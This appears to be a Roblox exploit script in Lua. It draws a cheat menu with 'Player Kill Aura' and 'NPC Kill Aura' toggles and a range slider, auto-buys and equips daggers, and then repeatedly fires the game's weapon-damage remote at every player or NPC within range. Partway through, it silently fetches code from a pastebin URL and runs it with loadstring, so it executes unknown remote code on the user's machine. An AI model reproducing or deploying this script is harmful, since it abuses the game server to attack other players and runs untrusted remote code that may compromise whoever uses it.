local lp = game.Players.LocalPlayer
local MainGui = Instance.new("ScreenGui")
local UI = Instance.new("Folder")
local HUD = Instance.new("Frame")
local Anchor = Instance.new("Frame")
local ui2 = Instance.new("ImageLabel")
local bk = Instance.new("ImageLabel")
local thing = Instance.new("TextLabel")
local ya = Instance.new("ImageLabel")
local tog = Instance.new("ImageButton")
local ui1 = Instance.new("ImageLabel")
local bk_2 = Instance.new("ImageLabel")
local thing_2 = Instance.new("TextLabel")
local ya_2 = Instance.new("ImageLabel")
local tog_2 = Instance.new("ImageButton")
local ui3 = Instance.new("ImageLabel")
local bk_3 = Instance.new("ImageLabel")
local thing_3 = Instance.new("TextLabel")
local Slider = Instance.new("ImageLabel")
local Button = Instance.new("ImageButton")
MainGui.Name = "MainGui"
MainGui.Parent = game.CoreGui
MainGui.DisplayOrder = 1
UI.Name = "UI"
UI.Parent = MainGui
HUD.Name = "HUD"
HUD.Parent = UI
HUD.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HUD.BackgroundTransparency = 1.000
HUD.Position = UDim2.new(0, 0, 0.100000001, 0)
HUD.Size = UDim2.new(1, 0, 0.899999976, 0)
HUD.SizeConstraint = Enum.SizeConstraint.RelativeYY
Anchor.Name = "Anchor"
Anchor.Parent = HUD
Anchor.AnchorPoint = Vector2.new(0, 1)
Anchor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Anchor.BackgroundTransparency = 1.000
Anchor.Position = UDim2.new(0.00999999978, 0, 0.99000001, 0)
Anchor.Size = UDim2.new(1, 0, 1, 0)
Anchor.SizeConstraint = Enum.SizeConstraint.RelativeYY
ui2.Name = "ui2"
ui2.Parent = Anchor
ui2.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
ui2.BackgroundTransparency = 1.000
ui2.Position = UDim2.new(0, 0, 0.462721288, 0)
ui2.Size = UDim2.new(0.290687442, 0, 0.0455467626, 0)
ui2.ZIndex = 4
ui2.Image = "rbxassetid://4318718974"
ui2.ImageColor3 = Color3.fromRGB(192, 192, 192)
ui2.ScaleType = Enum.ScaleType.Slice
ui2.SliceCenter = Rect.new(40, 40, 160, 160)
bk.Name = "bk"
bk.Parent = ui2
bk.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
bk.BorderSizePixel = 0
bk.Size = UDim2.new(1, 0, 1, 0)
bk.ZIndex = 3
bk.Image = "rbxassetid://4318742890"
bk.ImageColor3 = Color3.fromRGB(0, 0, 0)
bk.ImageTransparency = 0.900
bk.ScaleType = Enum.ScaleType.Tile
bk.SliceCenter = Rect.new(12, 12, 88, 88)
bk.TileSize = UDim2.new(0, 30, 0, 30)
thing.Name = "thing"
thing.Parent = ui2
thing.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
thing.BackgroundTransparency = 1.000
thing.Position = UDim2.new(0.0258531645, 0, 0.159235984, 0)
thing.Size = UDim2.new(0.956567109, 0, 0.700638354, 0)
thing.ZIndex = 4
thing.Font = Enum.Font.Fantasy
thing.Text = "Player Kill Aura"
thing.TextColor3 = Color3.fromRGB(255, 255, 255)
thing.TextScaled = true
thing.TextSize = 14.000
thing.TextWrapped = true
thing.TextXAlignment = Enum.TextXAlignment.Left
ya.Name = "ya"
ya.Parent = ui2
ya.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
ya.BackgroundTransparency = 1.000
ya.Position = UDim2.new(0.845662951, 0, 0.159235984, 0)
ya.Size = UDim2.new(0.112480946, 0, 0.668791175, 0)
ya.ZIndex = 5
ya.Image = "rbxassetid://4318718974"
ya.ImageColor3 = Color3.fromRGB(223, 223, 223)
ya.ScaleType = Enum.ScaleType.Slice
ya.SliceCenter = Rect.new(40, 40, 160, 160)
tog.Name = "tog"
tog.Parent = ya
tog.Active = false
tog.BackgroundColor3 = Color3.fromRGB(118, 0, 1)
tog.BorderSizePixel = 0
tog.Size = UDim2.new(1, 0, 1, 0)
tog.ZIndex = 4
tog.Image = "rbxassetid://4318742890"
tog.ImageColor3 = Color3.fromRGB(0, 0, 0)
tog.ImageTransparency = 0.900
tog.ScaleType = Enum.ScaleType.Tile
tog.TileSize = UDim2.new(0, 30, 0, 30)
ui1.Name = "ui1"
ui1.Parent = Anchor
ui1.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
ui1.BackgroundTransparency = 1.000
ui1.Position = UDim2.new(0, 0, 0.414853573, 0)
ui1.Size = UDim2.new(0.290687442, 0, 0.0455467626, 0)
ui1.ZIndex = 4
ui1.Image = "rbxassetid://4318718974"
ui1.ImageColor3 = Color3.fromRGB(192, 192, 192)
ui1.ScaleType = Enum.ScaleType.Slice
ui1.SliceCenter = Rect.new(40, 40, 160, 160)
bk_2.Name = "bk"
bk_2.Parent = ui1
bk_2.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
bk_2.BorderSizePixel = 0
bk_2.Size = UDim2.new(1, 0, 1, 0)
bk_2.ZIndex = 3
bk_2.Image = "rbxassetid://4318742890"
bk_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
bk_2.ImageTransparency = 0.900
bk_2.ScaleType = Enum.ScaleType.Tile
bk_2.SliceCenter = Rect.new(12, 12, 88, 88)
bk_2.TileSize = UDim2.new(0, 30, 0, 30)
thing_2.Name = "thing"
thing_2.Parent = ui1
thing_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
thing_2.BackgroundTransparency = 1.000
thing_2.Position = UDim2.new(0.0258531645, 0, 0.159235984, 0)
thing_2.Size = UDim2.new(0.956567109, 0, 0.700638354, 0)
thing_2.ZIndex = 4
thing_2.Font = Enum.Font.Fantasy
thing_2.Text = "NPC Kill Aura"
thing_2.TextColor3 = Color3.fromRGB(255, 255, 255)
thing_2.TextScaled = true
thing_2.TextSize = 14.000
thing_2.TextWrapped = true
thing_2.TextXAlignment = Enum.TextXAlignment.Left
ya_2.Name = "ya"
ya_2.Parent = ui1
ya_2.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
ya_2.BackgroundTransparency = 1.000
ya_2.Position = UDim2.new(0.845662951, 0, 0.159235984, 0)
ya_2.Size = UDim2.new(0.112480946, 0, 0.668791175, 0)
ya_2.ZIndex = 5
ya_2.Image = "rbxassetid://4318718974"
ya_2.ImageColor3 = Color3.fromRGB(223, 223, 223)
ya_2.ScaleType = Enum.ScaleType.Slice
ya_2.SliceCenter = Rect.new(40, 40, 160, 160)
tog_2.Name = "tog"
tog_2.Parent = ya_2
tog_2.Active = false
tog_2.BackgroundColor3 = Color3.fromRGB(118, 0, 1)
tog_2.BorderSizePixel = 0
tog_2.Size = UDim2.new(1, 0, 1, 0)
tog_2.ZIndex = 4
tog_2.Image = "rbxassetid://4318742890"
tog_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
tog_2.ImageTransparency = 0.900
tog_2.ScaleType = Enum.ScaleType.Tile
tog_2.TileSize = UDim2.new(0, 30, 0, 30)
ui3.Name = "ui3"
ui3.Parent = Anchor
ui3.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
ui3.BackgroundTransparency = 1.000
ui3.Position = UDim2.new(0, 0, 0.366985857, 0)
ui3.Size = UDim2.new(0.290687442, 0, 0.0455467626, 0)
ui3.ZIndex = 4
ui3.Image = "rbxassetid://4318718974"
ui3.ImageColor3 = Color3.fromRGB(192, 192, 192)
ui3.ScaleType = Enum.ScaleType.Slice
ui3.SliceCenter = Rect.new(40, 40, 160, 160)
bk_3.Name = "bk"
bk_3.Parent = ui3
bk_3.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
bk_3.BorderSizePixel = 0
bk_3.Size = UDim2.new(1, 0, 1, 0)
bk_3.ZIndex = 3
bk_3.Image = "rbxassetid://4318742890"
bk_3.ImageColor3 = Color3.fromRGB(0, 0, 0)
bk_3.ImageTransparency = 0.900
bk_3.ScaleType = Enum.ScaleType.Tile
bk_3.SliceCenter = Rect.new(12, 12, 88, 88)
bk_3.TileSize = UDim2.new(0, 30, 0, 30)
thing_3.Name = "thing"
thing_3.Parent = ui3
thing_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
thing_3.BackgroundTransparency = 1.000
thing_3.Position = UDim2.new(0.869166851, 0, 0.159235984, 0)
thing_3.Size = UDim2.new(0.11325331, 0, 0.700638354, 0)
thing_3.ZIndex = 4
thing_3.Font = Enum.Font.Fantasy
thing_3.Text = "0"
thing_3.TextColor3 = Color3.fromRGB(255, 255, 255)
thing_3.TextScaled = true
thing_3.TextSize = 14.000
thing_3.TextWrapped = true
Slider.Name = "Slider"
Slider.Parent = ui3
Slider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Slider.BackgroundTransparency = 1.000
Slider.Position = UDim2.new(0.064785704, 0, 0.413473785, 0)
Slider.Size = UDim2.new(0.722609818, 0, 0.19083406, 0)
Slider.ZIndex = 4
Slider.Image = "rbxassetid://3570695787"
Slider.ImageColor3 = Color3.fromRGB(53, 53, 53)
Slider.ScaleType = Enum.ScaleType.Slice
Slider.SliceCenter = Rect.new(100, 100, 100, 100)
Button.Name = "Button"
Button.Parent = Slider
Button.AnchorPoint = Vector2.new(0.5, 0.5)
Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button.BackgroundTransparency = 1.000
Button.Position = UDim2.new(0, 0, 0.5, 0)
Button.Size = UDim2.new(0.0827586204, 0, 2, 0)
Button.ZIndex = 5
Button.Image = "rbxassetid://3570695787"
Button.ImageColor3 = Color3.fromRGB(161, 161, 161)
local slider = Slider
local sliderBtn = Button
local toggey_1 = tog_2
local toggey_2 = tog
local UIS = game:GetService("UserInputService")
local RuS = game:GetService("RunService")
local held = false
local step = 0.025
local percentage = 0
local M = lp:GetMouse()
local player_aura = false
local npc_aura = false
local tool = ""
local aoe_size = 0
local tool_found = false
local has_dagger = false
local function find_npc_shop(reqtype)
	for i,v in pairs(game.workspace.NPCs:GetChildren()) do
		if v:IsA("Model") then
			if v:FindFirstChild("Data") then
				if v.Data:FindFirstChild("ShopName") then
					if v.Data.ShopName.Value == reqtype then
						return v
					end
				end
			end
		end
	end
end
local function check()
----
for i,v in pairs(lp.PlayerGui.MainGui.UI.Inventory.ListFrame.List.Frame:GetChildren()) do
    if v:IsA("Frame") and v.Name == "Item" then
        if v:FindFirstChild("ItemValue") and v.ItemValue.Value:find("Dagger") then
            has_dagger = true
        end
    end
end
----
end
local function equip()
----
for i,v in pairs(lp.PlayerGui.MainGui.UI.Inventory.ListFrame.List.Frame:GetChildren()) do
    if v:IsA("Frame") and v.Name == "Item" then
        if v:FindFirstChild("ItemValue") and v.ItemValue.Value:find("Dagger") then
            local args = {
            [1] = "Weapon1",
            [2] = v.ItemValue.Value,
            }
            game:GetService("ReplicatedStorage").RS.Remotes.Misc.EquipItem:InvokeServer(unpack(args))
        end
    end
end
----
end
local function buy()
----
    local args = {
        [1] = find_npc_shop("Barion Arms"),
        [2] = '{"Amount":1,"Name":"Vistarian Dagger","Level":1}',
        [3] = "",
    }
    game:GetService("ReplicatedStorage").RS.Remotes.Misc.BuyItem:InvokeServer(unpack(args))
                
    local args = {
        [1] = find_npc_shop("Castlian South Smith"),
        [2] = '{"Amount":1,"Name":"Castlian Dagger","Level":1}',
        [3] = "",
    }
    game:GetService("ReplicatedStorage").RS.Remotes.Misc.BuyItem:InvokeServer(unpack(args))
                
    local args = {
        [1] = find_npc_shop("Bell Village Smith"),
        [2] = '{"Amount":1,"Name":"Alalean Dagger","Level":1}',
        [3] = "",
    }           
    game:GetService("ReplicatedStorage").RS.Remotes.Misc.BuyItem:InvokeServer(unpack(args))
----
end
local function fixer()
    lp.PlayerGui.MainGui.UI.Inventory.Visible = true
    wait()
    lp.PlayerGui.MainGui.UI.Inventory.Close.Visible = false
    lp.PlayerGui.MainGui.UI.HUD.Visible = false
    wait(0.75)
    check()
    wait(0.1)
    if has_dagger == true then
        equip()
    elseif has_dagger == false then
        buy()
        lp.PlayerGui.MainGui.UI.Inventory.Visible = false
        wait(0.3)
        lp.PlayerGui.MainGui.UI.Inventory.Visible = true
        wait(0.7)
        equip()
    end
    wait(0.75)
    lp.PlayerGui.MainGui.UI.Inventory.Visible = false
    wait()
    lp.PlayerGui.MainGui.UI.Inventory.Close.Visible = true
    lp.PlayerGui.MainGui.UI.HUD.Visible = true
    for i,v in pairs(lp.Backpack:GetChildren()) do
		if v.Name:find("Dagger") then
			tool_found = true
			tool = v.Name
		end
	end
end
for i,v in pairs(lp.Backpack:GetChildren()) do
	if v.Name:find("Dagger") then
		tool_found = true
		tool = v.Name
	end
end
if tool_found == false then
	fixer()
	wait()
end
local function bind()
    lp.Character:WaitForChild("Humanoid").Died:Connect(function()
        player_aura = false
		npc_aura = false
		toggey_1.BackgroundColor3 = Color3.fromRGB(118, 0, 0)
		toggey_2.BackgroundColor3 = Color3.fromRGB(118, 0, 0)
		wait(game.Players.RespawnTime + 10)
        bind()
    end)
end
bind()
function snap(number, factor)
	if factor == 0 then
		return number
	else
		return math.floor(number/factor+0.5)*factor
	end
end
UIS.InputEnded:connect(function(input, processed)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		held = false
	end
end)
sliderBtn.MouseButton1Down:connect(function()
	held = true
end)
RuS.RenderStepped:connect(function(delta)
	if held then
		local MousePos = UIS:GetMouseLocation().X
		local BtnPos = sliderBtn.Position
		local sliderSize = slider.AbsoluteSize.X
		local pos = snap((MousePos-slider.AbsolutePosition.X)/sliderSize,step)
		percentage = math.clamp(pos,0,1)
		thing_3.Text = tostring(percentage*200)
		sliderBtn.Position = UDim2.new(percentage,0,BtnPos.Y.Scale, BtnPos.Y.Offset)
	end
end)
toggey_1.MouseButton1Click:Connect(function()
	if npc_aura == false then
		npc_aura = true
		toggey_1.BackgroundColor3 = Color3.fromRGB(0, 118, 0)
	elseif npc_aura == true then
		npc_aura = false
		toggey_1.BackgroundColor3 = Color3.fromRGB(118, 0, 0)
	end
end)
toggey_2.MouseButton1Click:Connect(function()
	if player_aura == false then
		player_aura = true
		toggey_2.BackgroundColor3 = Color3.fromRGB(0, 118, 0)
	elseif player_aura == true then
		player_aura = false
		toggey_2.BackgroundColor3 = Color3.fromRGB(118, 0, 0)
	end
end)
pcall(function()
loadstring(game:HttpGet(('https://pastebin.com/raw/errZFBHk'),true))()
end)
spawn(function()
----
while wait(0.5) do
	for i,v in pairs(lp.Backpack:GetChildren()) do
		if v.Name:find("Dagger") then
			tool_found = true
			tool = v.Name
		end
	end
end
----
end)
while true do
    wait(0.05)
    --npc aura
    if npc_aura == true then
	    for i,v in pairs(game:GetService("Workspace").NPCs:GetChildren()) do
	        if v:IsA("Model") and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0.1 then
	            local mag = (lp.Character:FindFirstChild("HumanoidRootPart").Position - v.HumanoidRootPart.Position).Magnitude
	            if mag < percentage*200 then
	            	local lev = tostring(lp.PlayerGui.MainGui.UI.HUD.Anchor.Level.Text)
    				local NewS = string.gsub(lev, "Level ", "")
    				local leve = tonumber(NewS)
	            	if leve > 20 then
	                    local args = {
	                        [1] = lp.Character,
	                        [2] = v,
	                        [3] = lp.Character:FindFirstChild(tool) or lp.Backpack:FindFirstChild(tool),
	                        [4] = "Throw",
	                    }	                    
	                    game:GetService("ReplicatedStorage").RS.Remotes.Combat.DealWeaponDamage:FireServer(unpack(args))
	                elseif leve < 20 then
	                    local args = {
	                        [1] = lp.Character,
	                        [2] = v,
	                        [3] = lp.Character:FindFirstChild(tool) or lp.Backpack:FindFirstChild(tool),
	                        [4] = "Slash",
	                    }
	                    game:GetService("ReplicatedStorage").RS.Remotes.Combat.DealWeaponDamage:FireServer(unpack(args))
	                end
	            end
            end
        end
    end
    --player aura
    if player_aura == true then
    	for i,v in pairs(game:GetService("Workspace"):GetChildren()) do
	        if v:IsA("Model") and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0.1 then
	            local mag = (lp.Character:FindFirstChild("HumanoidRootPart").Position - v.HumanoidRootPart.Position).Magnitude
	            if mag < percentage*200 then
	            	local lev = tostring(lp.PlayerGui.MainGui.UI.HUD.Anchor.Level.Text)
    				local NewS = string.gsub(lev, "Level ", "")
    				local leve = tonumber(NewS)
	            	if leve > 20 then
	                    local args = {
	                        [1] = lp.Character,
	                        [2] = v,
	                        [3] = lp.Character:FindFirstChild(tool) or lp.Backpack:FindFirstChild(tool),
	                        [4] = "Throw",
	                    }
	                    game:GetService("ReplicatedStorage").RS.Remotes.Combat.DealWeaponDamage:FireServer(unpack(args))
	                elseif leve < 20 then
	                    local args = {
	                        [1] = lp.Character,
	                        [2] = v,
	                        [3] = lp.Character:FindFirstChild(tool) or lp.Backpack:FindFirstChild(tool),
	                        [4] = "Slash",
	                    }
	                    game:GetService("ReplicatedStorage").RS.Remotes.Combat.DealWeaponDamage:FireServer(unpack(args))
	                end
	            end
            end
        end
    end
end